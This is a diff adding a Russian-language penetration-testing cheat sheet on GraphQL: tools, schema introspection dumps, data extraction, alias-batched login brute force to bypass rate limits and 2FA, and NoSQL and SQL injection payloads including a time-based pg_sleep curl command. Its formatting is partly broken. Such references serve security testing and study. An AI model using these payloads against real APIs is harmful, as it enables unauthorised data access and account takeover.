@@ -1,3 +1,398 @@
+> GraphQL — это язык запросов для API и среда выполнения для выполнения этих запросов с использованием существующих данных. Сервис GraphQL создается путем определения типов и полей для этих типов, а затем предоставления функций для каждого поля каждого типа.
+
+## Содержание
+
+*   [Инструменты](#инструменты)
+*   [Перечисление](#перечисление)
+    *   [Распространенные конечные точки GraphQL](#распространенные-конечные-точки-graphql)
+    *   [Идентификация точки внедрения](#идентификация-точки-внедрения)
+    *   [Перечисление схемы базы данных через интроспекцию](#перечисление-схемы-базы-данных-через-интроспекцию)
+    *   [Перечисление схемы базы данных через подсказки](#перечисление-схемы-базы-данных-через-подсказки)
+    *   [Перечисление определений типов](#перечисление-определений-типов)
+    *   [Список путей для достижения типа](#список-путей-для-достижения-типа)
+*   [Методология](#методология)
+    *   [Извлечение данных](#извлечение-данных)
+    *   [Извлечение данных с использованием Edges/Nodes](#извлечение-данных-с-использованием-edgesnodes)
+    *   [Извлечение данных с использованием проекций](#извлечение-данных-с-использованием-проекций)
+    *   [Мутации](#мутации)
+    *   [Атаки пакетной обработки GraphQL](#атаки-пакетной-обработки-graphql)
+        *   [Пакетная обработка на основе списка JSON](#пакетная-обработка-на-основе-списка-json)
+        *   [Пакетная обработка на основе имени запроса](#пакетная-обработка-на-основе-имени-запроса)
+*   [Внедрения](#внедрения)
+    *   [NoSQL Injection](#nosql-injection)
+    *   [SQL Injection](#sql-injection)
+*   [Лабораторные работы](#лабораторные-работы)
+*   [Ссылки](#ссылки)
+
+## Инструменты
+
+*   [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - Скриптовый движок для взаимодействия с graphql endpoint в целях тестирования на проникновение.
+*   [doyensec/graph-ql](https://github.com/doyensec/graph-ql) - Материалы для исследования безопасности GraphQL.
+*   [doyensec/inql](https://github.com/doyensec/inql) - Расширение Burp для тестирования безопасности GraphQL.
+*   [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - анализирует схему интроспекции GraphQL и генерирует возможные запросы.
+*   [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Перечисляет различные способы достижения заданного типа в схеме GraphQL.
+*   [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - Расширенная IDE для исследования GraphQL API.
+*   [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - Получение схемы GraphQL API, несмотря на отключенную интроспекцию.
+*   [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - Утилита для перебора паролей и фаззинга GraphQL.
+*   [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - Фреймворк угроз GraphQL, используемый специалистами по безопасности для исследования пробелов в безопасности в реализациях GraphQL.
+*   [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - Утилита для аудита безопасности GraphQL API.
+*   [dolevf/graphw00f](https://github.com/dolevf/graphw00f) - Утилита для определения движка сервера GraphQL.
+*   [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - Представляет любой GraphQL API в виде интерактивного графа.
+*   [Insomnia](https://insomnia.rest/) - Кроссплатформенный HTTP и GraphQL клиент.
+
+## Перечисление
+
+### Распространенные конечные точки GraphQL
+
+Чаще всего GraphQL находится по конечной точке `/graphql` или `/graphiql`. Более полный список доступен в [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/graphql.txt).
+
+/v1/explorer
+/v1/graphiql
+/graph
+/graphql
+/graphql/console/
+/graphql.php
+/graphiql
+/graphiql.php
+text
+
+
+### Идентификация точки внедрения
+
+example.com/graphql?query={__schema{types{name}}}
+example.com/graphiql?query={__schema{types{name}}}
+text
+
+
+Проверьте, видны ли ошибки.
+
+?query={__schema}
+?query={}
+?query={thisdefinitelydoesnotexist}
+text
+
+
+### Перечисление схемы базы данных через интроспекцию
+
+URL-кодированный запрос для дампа схемы базы данных.
+
+```fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}```
+
+text
+
+
+Декодированный URL запрос для дампа схемы базы данных.
+
+```graphql
+fragment FullType on __Type {
+  kind
+  name
+  description
+  fields(includeDeprecated: true) {
+    name
+    description
+    args {
+      ...InputValue
+    }
+    type {
+      ...TypeRef
+    }
+    isDeprecated
+    deprecationReason
+  }
+  inputFields {
+    ...InputValue
+  }
+  interfaces {
+    ...TypeRef
+  }
+  enumValues(includeDeprecated: true) {
+    name
+    description
+    isDeprecated
+    deprecationReason
+  }
+  possibleTypes {
+    ...TypeRef
+  }
+}
+fragment InputValue on __InputValue {
+  name
+  description
+  type {
+    ...TypeRef
+  }
+  defaultValue
+}
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+query IntrospectionQuery {
+  __schema {
+    queryType {
+      name
+    }
+    mutationType {
+      name
+    }
+    types {
+      ...FullType
+    }
+    directives {
+      name
+      description
+      locations
+      args {
+        ...InputValue
+      }
+    }
+  }
+}
+```
+Однострочные запросы для дампа схемы базы данных без фрагментов.
+```__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}```
+
+
+```{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}```
+
+Перечисление схемы базы данных через подсказки
+
+Когда вы используете неизвестное ключевое слово, бэкенд GraphQL ответит подсказкой, связанной с его схемой.
+json
+
+{
+  "message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?",
+}
+
+Вы также можете попробовать подобрать известные ключевые слова, имена полей и типов с использованием словарей, таких как Escape-Technologies/graphql-wordlist, когда схема GraphQL API недоступна.
+Перечисление определений типов
+
+Перечислите определение интересующих типов, используя следующий запрос GraphQL, заменив "User" на выбранный тип.
+graphql
+
+{
+  __type(name: "User") {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+        ofType {
+          name
+          kind
+        }
+      }
+    }
+  }
+}
+
+Список путей для достижения типа
+bash
+
+$ git clone https://gitlab.com/dee-see/graphql-path-enum
+$ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
+Found 27 ways to reach the "Skill" node from the "Query" node:
+- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
+- Query (query) -> Query (skills) -> Skill
+
+Методология
+Извлечение данных
+text
+
+example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
+
+HTB Help - GraphQL injection
+Извлечение данных с использованием Edges/Nodes
+graphql
+
+{
+  "query": "query {
+    teams{
+      total_count,edges{
+        node{
+          id,_id,about,handle,state
+        }
+      }
+    }
+  }"
+}
+
+Извлечение данных с использованием проекций
+
+    ⚠️ Не забудьте экранировать " внутри options.
+
+graphql
+
+{
+  doctors(options: "{\"patients.ssn\" :1}") {
+    firstName
+    lastName
+    id
+    patients {
+      ssn
+    }
+  }
+}
+
+Мутации
+
+Мутации работают как функции, вы можете использовать их для взаимодействия с GraphQL.
+graphql
+
+# mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
+# mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
+
+Атаки пакетной обработки GraphQL
+
+Распространенные сценарии:
+
+    Усиление атаки перебора паролей
+
+    Обход ограничения скорости (Rate Limit)
+
+    Обход двухфакторной аутентификации (2FA)
+
+Пакетная обработка на основе списка JSON
+
+    Пакетная обработка запросов (Query batching) — это функция GraphQL, которая позволяет отправлять несколько запросов на сервер в одном HTTP-запросе. Вместо отправки каждого запроса в отдельном запросе клиент может отправить массив запросов в одном POST-запросе на сервер GraphQL. Это уменьшает количество HTTP-запросов и может повысить производительность приложения.
+
+Пакетная обработка запросов работает путем определения массива операций в теле запроса. Каждая операция может иметь свой собственный запрос, переменные и имя операции. Сервер обрабатывает каждую операцию в массиве и возвращает массив ответов, по одному для каждого запроса в пакете.
+json
+
+[
+    {
+        "query":"..."
+    },
+    {
+        "query":"..."
+    },
+    {
+        "query":"..."
+    },
+    {
+        "query":"..."
+    }
+    ...
+]
+
+Пакетная обработка на основе имени запроса
+graphql
+
+{
+    "query": "query { qname: Query { field1 } qname1: Query { field1 } }"
+}
+
+Отправьте одну и ту же мутацию несколько раз, используя псевдонимы (aliases).
+graphql
+
+mutation {
+  login(pass: 1111, username: "bob")
+  second: login(pass: 2222, username: "bob")
+  third: login(pass: 3333, username: "bob")
+  fourth: login(pass: 4444, username: "bob")
+}
+
+Внедрения
+
+    Внедрения SQL и NoSQL все еще возможны, поскольку GraphQL — это всего лишь слой между клиентом и базой данных.
+
+NoSQL Injection
+
+Используйте $regex внутри параметра поиска.
+graphql
+
+{
+  doctors(
+    options: "{\"limit\": 1, \"patients.ssn\" :1}",
+    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }"
+  ) {
+    firstName
+    lastName
+    id
+    patients {
+      ssn
+    }
+  }
+}
+
+SQL Injection
+
+Отправьте одинарную кавычку ' внутри параметра GraphQL, чтобы вызвать SQL-инъекцию.
+graphql
+
+{
+  bacon(id: "1'") {
+    id
+    type
+    price
+  }
+}
+
+Простая SQL-инъекция внутри поля GraphQL.
+bash
+
+curl -X POST "http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27"
+
+Лабораторные работы
+
+Лабораторные работы будут перечислены здесь.
+Ссылки
+
+
+
+
+
+
+
+
+
+
+
+
 # Уязвимости GraphQL API
 
 Уязвимости GraphQL обычно возникают из-за ошибок реализации и проектирования. Например, функция интроспекции может быть оставлена активной, что позволяет злоумышленникам отправлять запросы к API для получения информации о его схеме.
